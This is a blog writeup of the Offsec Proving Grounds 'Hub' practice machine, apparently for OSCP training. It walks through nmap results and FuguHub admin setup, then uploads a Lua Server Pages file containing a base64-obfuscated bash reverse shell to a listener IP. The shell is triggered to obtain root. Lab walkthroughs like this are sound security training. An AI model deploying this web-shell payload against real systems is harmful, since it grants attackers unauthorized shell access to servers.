---
title: "Proving grounds Practice: Hub"
layout: post
date: 2023-08-18 06:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- Pg-Practice
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds practice linux machine writeup"
---

## Nmap

```sh
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp   open  http     nginx 1.18.0
8082/tcp open  http     Barracuda Embedded Web Server
| http-methods: 
|   Supported Methods: OPTIONS GET HEAD PROPFIND PATCH POST PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
|_  Potentially risky methods: PROPFIND PATCH PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
| http-webdav-scan: 
|   Server Type: BarracudaServer.com (Posix)
|   Server Date: Fri, 18 Aug 2023 04:51:55 GMT
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|_  WebDAV type: Unknown
|_http-title: Home
|_http-favicon: Unknown favicon MD5: FDF624762222B41E2767954032B6F1FF
|_http-server-header: BarracudaServer.com (Posix)
9999/tcp open  ssl/http Barracuda Embedded Web Server
|_http-title: Home
| http-webdav-scan: 
|   Server Type: BarracudaServer.com (Posix)
```

## Web

![img](/assets/images/CTF/Proving_Grounds/Hub/fugu01.png)

Fuguhub is vulnerable to [Remote Code Execution](https://github.com/ojan2021/Fuguhub-8.1-RCE)

**Set administrative account**

![img](/assets/images/CTF/Proving_Grounds/Hub/admin01.png)

**Login to the admin account**

![img](/assets/images/CTF/Proving_Grounds/Hub/admin-login.png)

- Direct to the Web file manager.
- Click upload file and upload below script.

## Remote Code Execution Exploit

```lsp
<div style="margin-left:auto;margin-right: auto;width: 350px;">

<div id="info">
<h2>Lua Server Pages Reverse Shell</h2>
<p>Delightful, isn't it?</p>
</div>

<?lsp if request:method() == "GET" then ?>
   <?lsp os.execute("echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xODcvMTIzNCAwPiYx | base64 -d | bash") ?>
<?lsp else ?>
   You sent a <?lsp=request:method()?> request
<?lsp end ?>

</div>
```

- Change the IP address and PORT in the base64 encoded value and save file as `.lsp`. 
- Upload the file to file server and visit the uploaded file to trigger the reverse shell.

![img](/assets/images/CTF/Proving_Grounds/Hub/rce-trigger.png)

![img](/assets/images/CTF/Proving_Grounds/Hub/root.png)

Root Obtained.

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).